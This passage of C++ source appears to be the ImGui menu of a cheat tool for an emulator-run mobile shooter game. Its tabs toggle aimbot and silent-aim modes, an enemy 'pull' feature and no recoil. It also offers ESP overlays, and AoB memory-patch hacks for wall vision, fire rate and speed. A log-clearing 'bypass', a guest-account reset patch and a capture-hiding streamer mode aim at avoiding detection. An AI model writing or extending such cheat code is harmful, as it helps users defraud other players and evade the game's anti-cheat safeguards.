                                ImGui::BeginDisabled(true);
                                custom::Button("Verifying...", ImVec2(card_size.x - 20.f, 46.f));
                                ImGui::EndDisabled();
                            }
                        }
                        ImGui::EndGroup();
                    }
                    custom::EndChild();
                }
                ImGui::EndGroup();
            }
            else {


                p_tabs.DrawTabs();

                if (p_tabs.IsTabActive(0)) {
                    // Content area above bottom tab bar, starting near left edge
                    ImGui::SetCursorPos(ImVec2(20.f, 80 + tab_offset));

                    ImGui::BeginGroup();
                    {
                        custom::Child("Aim",
                            ImVec2((ImGui::GetContentRegionAvail().x / 2),
                                ImGui::GetContentRegionAvail().y - s.FramePadding.y - 100.f + tab_offset),
                            true);
                        {
                            //if (custom::Checkbox("Aimbot", "Rage or Legit aim assist.", &aimbot_master_enabled)) {
                            //    aimbot_master_enabled = !aimbot_master_enabled; // Revert click state
                            //    ToggleAimbotMaster(); // Toggle cleanly
                            //}

                            //if (aimbot_master_enabled) {
                            //    if (custom::Combo("Aimbot Type", "Rage = fast. Legit = smooth.", &aimbot_type, aimbot_items, IM_ARRAYSIZE(aimbot_items))) {
                            //        // If combo changed while active, refresh state
                            //        aimbot_master_enabled = false;
                            //        ToggleAimbotMaster();
                            //    }
                            //}

                        /*    const char* ExternalBones[] = { "Head", "Neck", "Chest", "Left Neck", "Right Neck" };
                            int boneIndex = g_Globals.AimBot.ExternalBone;

                            custom::Checkbox("AimBot External", "Aimbot External Aim", &g_Globals.AimBot.ExternalEnabled);
                            if (g_Globals.AimBot.ExternalEnabled) {
                                if (custom::Combo("Select External Bones", "Select Your Aim Pos", &boneIndex, ExternalBones, IM_ARRAYSIZE(ExternalBones))) {
                                    if (boneIndex < 0 || boneIndex >= IM_ARRAYSIZE(ExternalBones))
                                        boneIndex = 0;
                                    g_Globals.AimBot.ExternalBone = boneIndex;
                                }
                            }*/


                            const char* aimbotModeItems[] = { "Disabled", "Aimbot Visible", "Aimbot Rage (Extreme)" };
                            int currentAimMode = g_Options.LegitBot.AimBot.AimMode;
                            if (custom::Combo("Aimbot Mode", "Select Aimbot type (Visible or Rage)", &currentAimMode, aimbotModeItems, IM_ARRAYSIZE(aimbotModeItems))) {
                                if (currentAimMode < 0 || currentAimMode >= IM_ARRAYSIZE(aimbotModeItems))
                                    currentAimMode = 0;
                                g_Options.LegitBot.AimBot.AimMode = currentAimMode;
                                if (currentAimMode == 1) {
                                    g_Options.LegitBot.AimBot.VisibleEnabled = true;
                                    g_Options.LegitBot.AimBot.ExtremeEnabled = false;
                                    FrameWork::AimBotVisible::Start();
                                }
                                else if (currentAimMode == 2) {
                                    g_Options.LegitBot.AimBot.VisibleEnabled = false;
                                    g_Options.LegitBot.AimBot.ExtremeEnabled = true;
                                    FrameWork::AimBotRage::Start();
                                }
                                else {
                                    g_Options.LegitBot.AimBot.VisibleEnabled = false;
                                    g_Options.LegitBot.AimBot.ExtremeEnabled = false;
                                }
                            }

                            if (g_Options.LegitBot.AimBot.AimMode == 1 || g_Options.LegitBot.AimBot.VisibleEnabled) {
                                custom::Checkbox("When Shooting Only", "Aim only when holding LBUTTON.", &g_Options.LegitBot.AimBot.WhenShooting);
                                custom::SliderFloat("Visible Aim Range", "Max distance in meters.", &g_Options.LegitBot.AimBot.DistanceVisible, 10.0f, 500.0f, "%.0fm");
                                custom::SliderFloat("Visible FOV Range", "FOV Radius in pixels.", &g_Options.LegitBot.AimBot.FOVRange, 10.0f, 1200.0f, "%.1f");
                                custom::Checkbox("Ignore Knocked", "Skip downed enemies.", &g_Options.LegitBot.AimBot.IgnoreDowned);
                            }
                            else if (g_Options.LegitBot.AimBot.AimMode == 2 || g_Options.LegitBot.AimBot.ExtremeEnabled) {
                                custom::Checkbox("When Shooting Only", "Aim only when holding LBUTTON.", &g_Options.LegitBot.AimBot.WhenShooting);
                                if (!g_Options.LegitBot.AimBot.WhenShooting) {
                                    custom::Checkbox("Left Mouse Key", "Use LBUTTON for AimKey.", &g_Options.LegitBot.AimBot.LMouse);
                                }
                                const char* extremeHitboxModes[] = { "Head", "Neck" };
                                custom::Combo("Extreme Hitbox", "Target Bone (0=Head, 1=Neck).", &g_Options.LegitBot.AimBot.Hitbox, extremeHitboxModes, IM_ARRAYSIZE(extremeHitboxModes));

                                custom::Checkbox("Extreme FOV Limit", "Limit aim within FOV range.", &g_Options.LegitBot.AimBot.UseFOV);
                                if (g_Options.LegitBot.AimBot.UseFOV) {
                                    custom::SliderFloat("Extreme FOV Range", "FOV Radius in pixels.", &g_Options.LegitBot.AimBot.FOVRange, 10.0f, 1200.0f, "%.1f");
                                }
                                custom::SliderFloat("Extreme Distance", "Max distance in meters.", &g_Options.LegitBot.AimBot.DistanceExtreme, 10.0f, 500.0f, "%.0fm");

                                custom::Checkbox("Priority: Crosshair", "Target closest to crosshair.", &g_Options.LegitBot.AimBot.MultiComboTargetPriority[0]);
                                custom::Checkbox("Priority: Lowest HP", "Target lowest health enemy.", &g_Options.LegitBot.AimBot.MultiComboTargetPriority[1]);
                                custom::Checkbox("Priority: Distance", "Target closest enemy in world.", &g_Options.LegitBot.AimBot.MultiComboTargetPriority[2]);

                                custom::Checkbox("Extreme Ignore Knocked", "Skip downed enemies.", &g_Options.LegitBot.AimBot.IgnoreDowned);
                                custom::Checkbox("Extreme Ignore Bots", "Skip bot targets.", &g_Options.LegitBot.AimBot.IgnoreTrainingBots);
                            }

                            custom::Checkbox("Silent Aimbot", "Redirects bullets while firing.", &g_Globals.AimBot.SilentAimReworked);
                            if (g_Globals.AimBot.SilentAimReworked) {
                                const char* silentAimModes[] = { "Closest to Crosshair", "360 Target" };
                                int modeIndex = (g_Globals.AimBot.SilentAimTargetMode == 2) ? 1 : 0;
                                if (custom::Combo("Silent Aim Mode", "Crosshair FOV or 360 target.", &modeIndex, silentAimModes, IM_ARRAYSIZE(silentAimModes))) {
                                    if (modeIndex < 0 || modeIndex >= IM_ARRAYSIZE(silentAimModes))
                                        modeIndex = 0;
                                }
                                g_Globals.AimBot.SilentAimTargetMode = (modeIndex == 1) ? 2 : 0;

                                custom::Combo("Silent Aim Target", "Head or body hitbox.", &g_Globals.AimBot.SilentAimHitboxMode, forceAimHitboxModes, IM_ARRAYSIZE(forceAimHitboxModes));
                            }

                            custom::Checkbox("Pull Enemy 360", "Magnet pull while firing.", &g_Globals.Misc.PullEnemy360Enabled);
                            if (g_Globals.Misc.PullEnemy360Enabled) {
                                custom::Combo("Pull 360 Bone", "Head = root pull. Body = hip + FOV.", &g_Globals.Misc.PullEnemy360Mode, forceAimHitboxModes, IM_ARRAYSIZE(forceAimHitboxModes));
                            }

                          

                          /*  custom::Checkbox("Aimbot External", "Memory aimbot.", &checkboxes[5]);
                            if (checkboxes[5] != prev_aimbot_memory_state)
                                AimbotExternalRunToggle(checkboxes[5]);*/

                            custom::Checkbox("Show Aim FOV", "Shows aim search circle.", &g_Globals.Misc.ShowAimbotFov);

                            custom::Checkbox("No Recoil", "Less weapon kick.", &g_Globals.AimBot.NoRecoil);
                            custom::Checkbox("No Reload", "Faster reload.", &g_Globals.Misc.FastReload);
                          //  custom::Checkbox("Unlimited Ammo", "Mag never empties.", &g_Globals.Misc.UnlimitedAmmo);
                            custom::Checkbox("Ignore Bots", "Skip bot targets.", &g_Globals.AimBot.IgnoreBots);
                            custom::Checkbox("Ignore Knocked", "Skip downed enemies.", &g_Globals.AimBot.IgnoreKnocked);

                        }
                        custom::EndChild();

                        ImGui::SameLine();

                        custom::Child("Trigger Module",
                            ImVec2(ImGui::GetContentRegionAvail().x,
                                ImGui::GetContentRegionAvail().y - s.FramePadding.y - 100.f + tab_offset),
                            true);
                        {
                            custom::SliderFloat("Fov Radius", "Aim search radius (px).", &g_Globals.AimBot.Fov, 0.0f, 1200.0f, "%.1f");
                            custom::SliderInt("Aim Distance", "Max aim range (m).", &g_Globals.AimBot.DistanceAim, 0, 200, "%dm");
                          //  custom::SliderFloat("Smoothness", "Rage Aimbot delay (ms). 1=instant snap, 100=legit slow. Mirrors LEGIT XITERS Config.smooth.", &aimlegit, 1.00f, 100.00f, "%.0f ms");



                           /* if (custom::Checkbox("Only Red", "Forces damage to register as critical headshots (Red numbers).", &checkboxes[7629]))
                            {
                                if (checkboxes[7629])
                                {
                                    std::thread([]()
                                        {
                                            Aim.OnlyRedON();
                                            p_notif.AddMessage("Only Red Enabled", ICON_BOMB_FILL, c::anim::active);
                                        }).detach();
                                }
                                else
                                {
                                    std::thread([]()
                                        {
                                            Aim.OnlyRedOFF();
                                            p_notif.AddMessage("Only Red Disabled", ICON_BOMB_FILL, ImColor(255, 80, 80, 255));
                                        }).detach();
                                }
                            }*/

                            if (custom::Checkbox("Glitch Fire", "Higher fire rate.", &checkboxes[5931]))
                            {
                                BlazeMemOnCheckboxToggled(5931, "Glitch Fire",
                                    []() { Aim.GlitchFireON(); }, []() { Aim.GlitchFireOFF(); });
                            }

                            custom::Checkbox("Sniper Scope", "Sniper aim on fire.", &g_Globals.Misc.SniperScope);
                            if (g_Globals.Misc.SniperScope) {
                                custom::Combo("Sniper Scope Mode", "Head or body hitbox.", &g_Globals.Misc.SniperScopeMode, forceAimHitboxModes, IM_ARRAYSIZE(forceAimHitboxModes));
                            }

                            if (custom::Checkbox("Sniper Switch", "Fast sniper weapon swap.", &checkboxes[8]))
                            {
                                BlazeMemOnCheckboxToggled(8, "Sniper Switch",
                                    []() { Aim.SniperSwitchon(); }, []() { Aim.SniperSwitchoff(); });
                            }

                            //if (custom::Checkbox("Sniper Delay Fix", "Less sniper shot delay.", &checkboxes[12]))
                            //{
                            //    BlazeMemOnCheckboxToggled(12, "Sniper Delay Fix",
                            //        []() { Aim.SniperDelayFixON(); }, []() { Aim.SniperDelayFixOFF(); });
                            //}

                           

                        }
                        custom::EndChild();
                    }
                    ImGui::EndGroup();
                }

                if (p_tabs.IsTabActive(1)) {
                    ImGui::SetCursorPos(ImVec2(20.f, 80 + tab_offset));

                    ImGui::BeginGroup();
                    {
                        // Left: all ESP widgets (settings + colors)
                        custom::Child("ESP",
                            ImVec2(ImGui::GetContentRegionAvail().x / 2,
                                ImGui::GetContentRegionAvail().y - s.FramePadding.y - 100.f + tab_offset),
                            true);
                        {

                            const ImGuiColorEditFlags espColorFlags = ImGuiColorEditFlags_NoSidePreview | ImGuiColorEditFlags_PickerHueBar | ImGuiColorEditFlags_NoOptions | ImGuiColorEditFlags_NoInputs;



                            custom::Checkbox("Enable ESP", "All player ESP on/off.", &g_Globals.Visuals.Enabled);

                         

                            const char* lineModes[] = { "Top", "Center", "Bottom" };
                            custom::VisualBox("ESP Lines", "Tracer lines to enemies.", &g_Globals.Visuals.Lines, &g_Globals.Visuals.EspLines, lineModes, IM_ARRAYSIZE(lineModes), (float*)&g_Globals.Visuals.SnapLinesColor, espColorFlags);
                            if (g_Globals.Visuals.EspLines < 0 || g_Globals.Visuals.EspLines >= IM_ARRAYSIZE(lineModes)) g_Globals.Visuals.EspLines = 0;

                            if (g_Globals.Visuals.Lines) {
                                bool lineLogoOn = (g_Globals.Visuals.ShowLogo != 0);
                                if (custom::Checkbox("Top Line Logo", "Logo on line start.", &lineLogoOn))
                                    g_Globals.Visuals.ShowLogo = lineLogoOn ? 1 : 0;
                            }

                            const char* boxModes[] = { "Dynamic", "Cornered" };
                            custom::VisualBox("Box ESP", "Box around enemies.", &g_Globals.Visuals.Box, &g_Globals.Visuals.players_box, boxModes, IM_ARRAYSIZE(boxModes), (float*)&g_Globals.Visuals.BoxColor, espColorFlags);
                            if (g_Globals.Visuals.players_box < 0 || g_Globals.Visuals.players_box >= IM_ARRAYSIZE(boxModes)) g_Globals.Visuals.players_box = 0;

                            custom::ColorBox("Enable Skeleton", "Bone skeleton overlay.", &g_Globals.Visuals.Skeleton, (float*)&g_Globals.Visuals.SkeletonColor, espColorFlags);

                            custom::ColorBox("Enable Name", "Player name tag.", &g_Globals.Visuals.Name, (float*)&g_Globals.Visuals.NameColor, espColorFlags);
                            custom::ColorBox("Enable Distance", "Distance in meters.", &g_Globals.Visuals.Distance, (float*)&g_Globals.Visuals.DistanceColor, espColorFlags);

                            custom::ColorBox("ESP Rank", "Rank name and points.", &g_Globals.Visuals.Rank, (float*)&g_Globals.Visuals.RankColor, espColorFlags);

                            custom::Checkbox("Health Bar", "HP bar on enemies.", &g_Globals.Visuals.HealthBar);

                            custom::Checkbox("Weapon Icon", "Weapon icon.", &g_Globals.Visuals.WeaponIcon);
                            custom::Checkbox("Weapon Name", "Weapon name text.", &g_Globals.Visuals.WeaponName);

                            custom::Checkbox("ESP Origin Line", "Line to nearest under 20m.", &g_Globals.Visuals.SnapLines);
                            custom::Checkbox("Wukong Mode", "Visible enemies only.", &g_Globals.EspConfig.showOnlyVisible);

                            custom::Checkbox("Loot ESP", "Ground loot labels.", &g_Globals.Loot.Enabled);
                            if (g_Globals.Loot.Enabled) {
                                custom::SliderInt("Loot Range", "Loot draw distance (m).", &g_Globals.Loot.RenderDistance, 20, 500, "%dm");
                                custom::Checkbox("Item Picker", "Filter loot types.", &g_Globals.Loot.ShowPicker);
                            }

                            custom::SliderInt("ESP Distance", "ESP draw distance (m).", &g_Globals.Visuals.RenderDistance, 0, 200, "%dm");

                            custom::Checkbox("Invalid Timer", "Match timer display.", &g_Globals.Visuals.InvalidTimer);
                            custom::Checkbox("Rainbow Mode", "Cycle ESP colors.", &g_Globals.Visuals.RainbowESP);
                            custom::Checkbox("Ignore Training Bots", "Hide training bots.", &g_Globals.Visuals.IgnoreTrainingBots);

                         //   custom::Checkbox("Auto Refresh ESP", "Auto clear cache every 2 seconds.", &g_Globals.EspConfig.AutoRefresh);

                            static std::chrono::steady_clock::time_point s_lastRefreshEspButton;
                            if (custom::Button("Refresh ESP", ImVec2(400, 35))) {
                                const auto now = std::chrono::steady_clock::now();
                                if (std::chrono::duration_cast<std::chrono::milliseconds>(now - s_lastRefreshEspButton).count() >= 250) {
                                    s_lastRefreshEspButton = now;
                                    g_Globals.EspConfig.Refresh = true;
                                    p_notif.AddMessage("ESP Refreshed", ICON_BOMB_FILL, c::anim::active);
                                }
                            }

                            custom::EndChild();

                            ImGui::SameLine();

                            // Right: ESP Preview (always visible)
                            custom::Child("ESP Preview",
                                ImVec2(ImGui::GetContentRegionAvail().x,
                                    ImGui::GetContentRegionAvail().y - s.FramePadding.y - 100.f + tab_offset),
                                true);
                            {
                                m_esp_draw.set_positions();
                                m_esp_draw.on_draw();
                            }
                            custom::EndChild();
                        }
                        ImGui::EndGroup();
                    }
                }

                if (p_tabs.IsTabActive(2)) {
                    ImGui::SetCursorPos(ImVec2(20.f, 80 + tab_offset));

                    ImGui::BeginGroup();
                    {
                        custom::Child("Brutal",
                            ImVec2((ImGui::GetContentRegionAvail().x / 2),
                                ImGui::GetContentRegionAvail().y - s.FramePadding.y - 100.f + tab_offset),
                            true);
                        {

                            custom::Checkbox("Speed Timer", "Faster sprint (hotkey).", &g_Globals.Misc.SpeedTimerEnabled);

                            if (custom::Button("Load Wall Hack", ImVec2(ImGui::GetContentRegionAvail().x, 40))) {
                                BlazeMemRunLoad("Wall Hack", []() { Aim.SaveWallhackAoB(); });
                            }

                            if (custom::Checkbox("Wall Hack", "See through walls. Load first.", &checkboxes[31])) {
                                BlazeMemOnCheckboxToggled(31, "Wall Hack",
                                    []() { Aim.ActivateWallhack(); }, []() { Aim.OFFWallhack(); });
                            }

                            if (custom::Button("Load Camera Right", ImVec2(ImGui::GetContentRegionAvail().x, 40))) {
                                BlazeMemRunLoad("Camera Right", []() { Aim.SaveCameraAoB(); });
                            }

                            if (custom::Checkbox("Camera Right", "Camera peek right. Load first.", &checkboxes[301])) {
                                BlazeMemOnCheckboxToggled(301, "Camera Right",
                                    []() { Aim.ActivateCamera(); }, []() { Aim.OFFCamera(); });
                            }

                            if (custom::Button("Load Fast Landing Hack", ImVec2(ImGui::GetContentRegionAvail().x, 40))) {
                                BlazeMemRunLoad("Fast Landing Hack", []() { Aim.SaveFastlandingAoB(); });
                            }

                            if (custom::Checkbox("Fast Landing Hack", "Land faster. Load first.", &checkboxes[111])) {
                                BlazeMemOnCheckboxToggled(111, "Fast Landing",
                                    []() { Aim.ActivateFastlanding(); }, []() { Aim.OFFFastlanding(); });
                            }

                          // custom::Checkbox("TeleKill", "Enemy to 1m in front (10m range).", &g_Globals.Misc.TeleKill);

                        }
                        custom::EndChild();

                        ImGui::SameLine();

                        custom::Child("Machine Module",
                            ImVec2(ImGui::GetContentRegionAvail().x,
                                ImGui::GetContentRegionAvail().y - s.FramePadding.y - 100.f + tab_offset),
                            true);
                        {

                            custom::Checkbox("Burst Fire", "Rapid burst fire.", &g_Globals.Misc.FastFire);
                            custom::Checkbox("Vision Hack", "See farther on map.", &g_Globals.Misc.VisionHackEnabled);

                            if (custom::Checkbox("Spin Player", "Spin your character.", &g_Globals.Misc.SpinPlayer)) {
                                if (g_Globals.Misc.SpinPlayer) {
                                    SpinPlayer::Start();
                                    p_notif.AddMessage("Spin Player Enabled", ICON_BOMB_FILL, c::anim::active);
                                }
                                else {
                                    SpinPlayer::Stop();
                                    p_notif.AddMessage("Spin Player Disabled", ICON_BOMB_FILL, ImColor(255, 80, 80, 255));
                                }
                            }
                            if (g_Globals.Misc.SpinPlayer) {
                                custom::SliderFloat("Spin Speed", "Spin speed (1x–15x).", &g_Globals.Misc.SpinPlayerSpeed, 1.0f, 15.0f, "%.0fx");
                            }

                          /*  if (custom::Checkbox("No Gravity Fly", "Fly: WASD, Space up, Ctrl down.", &g_Globals.Misc.NoGravityFlyEnabled)) {
                                if (g_Globals.Misc.NoGravityFlyEnabled) {
                                    g_Globals.Misc.FlyHackInternalEnabled = false;
                                    FlyHack_LocalPlayer::Stop();
                                    NoGravityFly::Start();
                                    p_notif.AddMessage("No Gravity Fly Enabled", ICON_BOMB_FILL, c::anim::active);
                                } else {
                                    NoGravityFly::Stop();
                                    p_notif.AddMessage("No Gravity Fly Disabled", ICON_BOMB_FILL, ImColor(255, 80, 80, 255));
                                }
                            }*/

                            custom::Checkbox("Down Player", "Push model downward.", &g_Globals.Misc.DownPlayer);

                            if (custom::Checkbox("Guest Reset", "Guest account reset patch.", &checkboxes[9154]))
                            {
                                BlazeMemOnCheckboxToggled(9154, "Guest Reset",
                                    []() { Aim.GuestResetON(); }, []() { Aim.GuestResetOFF(); });
                            }

                        }
                        custom::EndChild();
                    }
                    ImGui::EndGroup();
                }

                if (p_tabs.IsTabActive(3)) {
                    ImGui::SetCursorPos(ImVec2(20.f, 80 + tab_offset));

                    ImGui::BeginGroup();
                    {
                        custom::Child("Keybinds 1",
                            ImVec2((ImGui::GetContentRegionAvail().x / 2),
                                ImGui::GetContentRegionAvail().y - s.FramePadding.y - 100.f + tab_offset),
                            true);
                        {
                            custom::Keybind("Menu Key", "Open/close menu.", &keybind_menu_key, &keybind_mode[100], false);
                          //  custom::Keybind("Aimbot Key", "Toggle rage aimbot.", &keybind_aimbot, &keybind_mode[0]);
                       //    custom::Keybind("Aimbot Legit Key", "Hold legit aim.", &keybind_aimbot_legit, &keybind_mode[22]);
                         //  custom::Keybind("Aimbot External Key", "Toggle memory aimbot on/off.", &keybind_aimbot_external, &keybind_mode[23]);
                          // custom::Keybind("External Aim Toggle", "Toggle external aimbot on/off.", &g_Globals.AimBot.ExternalKey, &keybind_mode[27]);
                           custom::Keybind("Sniper Switch Key", "Toggle sniper switch.", &keybind_sniper_switch, &keybind_mode[8]);
                           custom::Keybind("Sniper Scope Key", "Toggle sniper scope aim.", &keybind_sniper_scope, &keybind_mode[28]);
                          
                           
                        //    custom::Keybind("Burst Fire Key", "Toggle burst fire.", &keybind_burst_fire, &keybind_mode[24]);
                            custom::Keybind("Streamer Mode Key", "Toggle streamer hide.", &keybind_streamer_mode, &keybind_mode[21]);
                        }
                        custom::EndChild();

                        ImGui::SameLine();

                        custom::Child("Keybinds 2",
                            ImVec2(ImGui::GetContentRegionAvail().x,
                                ImGui::GetContentRegionAvail().y - s.FramePadding.y - 100.f + tab_offset),
                            true);
                        {
                           // custom::Keybind("Speed Key", "Toggle speed hack.", &keybind_speed_hack, &keybind_mode[14]);
                            custom::Keybind("Speed Timer Key", "Toggle speed timer.", &keybind_speed_timer, &keybind_mode[9]);
                            custom::Keybind("Wall Key", "Toggle wall hack.", &keybind_wall_hack, &keybind_mode[15]);
                            custom::Keybind("Fast Land Key", "Toggle fast landing.", &keybind_fast_landing, &keybind_mode[16]);
                            custom::Keybind("Camera Key", "Toggle camera right.", &keybind_camera_right, &keybind_mode[17]);
                            
                          //  custom::Keybind("Down Player Key", "Toggle down player.", &keybind_down_player, &keybind_mode[6]);
                           

                            custom::Keybind("Refresh ESP Key", "Refresh ESP cache.", &keybind_refresh_esp, &keybind_mode[88]);
                            custom::Keybind("Wukong Mode Key", "Toggle visible ESP.", &keybind_wukong_mode, &keybind_mode[26]);
                        }
                        custom::EndChild();
                    }
                    ImGui::EndGroup();
                }

                if (p_tabs.IsTabActive(4)) {
                    ImGui::SetCursorPos(ImVec2(20.f, 80 + tab_offset));

                    ImGui::BeginGroup();
                    {
                        custom::Child("General Settings",
                            ImVec2((ImGui::GetContentRegionAvail().x / 2),
                                ImGui::GetContentRegionAvail().y - s.FramePadding.y - 100.f + tab_offset),
                            true);
                        {
                            if (custom::Checkbox("Lite Bypass PC Logs", "Clear emulator logs.", &checkboxes[352])) {
                                if (checkboxes[352]) {
                                    std::thread taskThread([]() { PCBypass(); });
                                    taskThread.detach();
                                }
                            }
                            // custom::Keybind("Bypass Key", "Lite Bypass Hotkey", &keybind_pcbypass, &keybind_mode[12]);

                            if (custom::Checkbox("Temp File Cleaner", "Delete temp/cache files.", &checkboxes[354])) {
                                if (checkboxes[354]) {
                                    std::thread taskThread([]() { TempCleaner(); });
                                    taskThread.detach();
                                }
                            }
                            //   custom::Keybind("Temp Key", "Temp File Cleaner Hotkey", &keybind_tempcleaner, &keybind_mode[13]);

                            custom::Checkbox("Streamer Mode", "Hide menu from capture.", &g_Globals.General.Capture);
                            custom::Checkbox("Disable All Effects", "For low-end PCs. Disables animations, glow, and heavy shaders for smoother FPS.", &g_Globals.General.DisableAllEffects);

                            if (!scan_method_inited) {
                                scan_method_mode = 0;
                                fastinject = true;
                                scan_method_inited = true;
                            }
                            const char* scanModes[] = { "Mid Scan (Default)", "Slow Scan (Low End)" };
                            if (custom::Combo("Scan Method", "Mid = normal PC. Slow = low-end.", &scan_method_mode, scanModes, IM_ARRAYSIZE(scanModes))) {
                                fastinject = (scan_method_mode == 0);
                                p_notif.AddMessage(fastinject ? "Scan Method: Mid Scan" : "Scan Method: Slow Scan", ICON_BOMB_FILL, c::anim::active);
                            }
                            custom::Checkbox("Auto UI Color", "Cycle menu accent color.", &g_Globals.General.AutoColorChange);

                            if (!g_Globals.General.AutoColorChange) {
                                custom::ColorEdit4("Interface Color",
                                    "Fixed menu accent color.",
                                    (float*)&c::anim::active,
                                    picker_flags);
                            }

                            // ImGui::Dummy(ImVec2(0.0f, 10.0f));

                            if (custom::Checkbox("Save Configuration", "Saves current settings for the next launch.", &checkboxes[400])) {
                                if (checkboxes[400]) {
                                    SaveConfig();
                                }
                            }

                            // Add spacing


                            if (custom::Button("Reset Config", ImVec2(ImGui::GetContentRegionAvail().x, 40))) {
                                ResetConfig();
                            }

                            //ImGui::Dummy(ImVec2(0.0f, 6.0f));

                            if (custom::Button("Exit Panel", ImVec2(ImGui::GetContentRegionAvail().x, 40))) {
                                std::thread([]() {
                                    adb::KillEmulatorAndAdbOnExit();
                                    g_Globals.General.ShutDown = true;
                                }).detach();
                            }
                        }
                        custom::EndChild();
                    }
                    ImGui::EndGroup();
                }
            }

            p_notif.Render();
        }
        End();

        if (p_tabs.IsTabActive(1) && g_Globals.Loot.Enabled && g_Globals.Loot.ShowPicker)
            LootUI::DrawPickerPanel(true);
    }




    void Interface::WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
        switch (uMsg) {
        case WM_SIZE:
            if (wParam != SIZE_MINIMIZED) {
                ResizeWidht = (UINT)LOWORD(lParam);
                ResizeHeight = (UINT)HIWORD(lParam);
            }
            break;
        }

        if (bIsMenuOpen) {
            ImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam);
        }
    }

    void Interface::HandleMenuKey() {
        if (!hWindow || !IsWindow(hWindow))
            return;
        if (ResizeHeight != 0 || ResizeWidht != 0)
            return;

        static bool MenuKeyDown = false;
        if (GetAsyncKeyState(keybind_menu_key) & 0x8000) {
            if (!MenuKeyDown) {
                MenuKeyDown = true;
                bIsMenuOpen = !bIsMenuOpen;

                if (bIsMenuOpen) {
                    SetWindowLongPtr(hWindow, GWL_EXSTYLE, WS_EX_TOPMOST | WS_EX_TOOLWINDOW);
                    SetForegroundWindow(hWindow);
                    if (ImGui::GetCurrentContext()) {
                        ImGui::GetIO().MouseDrawCursor = true;
                    }
                }
                else {
                    SetWindowLongPtr(hWindow, GWL_EXSTYLE, WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_TRANSPARENT | WS_EX_LAYERED | WS_EX_NOACTIVATE);
                    if (ImGui::GetCurrentContext()) {
                        ImGui::GetIO().MouseDrawCursor = false;
                        ImGui::GetIO().WantCaptureMouse = false;
                        ImGui::GetIO().WantCaptureKeyboard = false;
                        ImGui::ClearActiveID();
                    }
                    if (hTargetWindow && IsWindow(hTargetWindow))
                        SetForegroundWindow(hTargetWindow);
                }
                SetWindowPos(hWindow, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE | SWP_FRAMECHANGED);
            }
        }
        else {
            MenuKeyDown = false;
        }
    }

    void Interface::ShutDown() {
        if (bShutdownDone)
            return;
        bShutdownDone = true;
        SpinPlayer::Stop();
        NoGravityFly::Stop();
        FWork::PullEnemy360Cpp::Stop();
        ImGui_ImplDX11_Shutdown();
        ImGui_ImplWin32_Shutdown();
        ImGui::DestroyContext();
    }
}
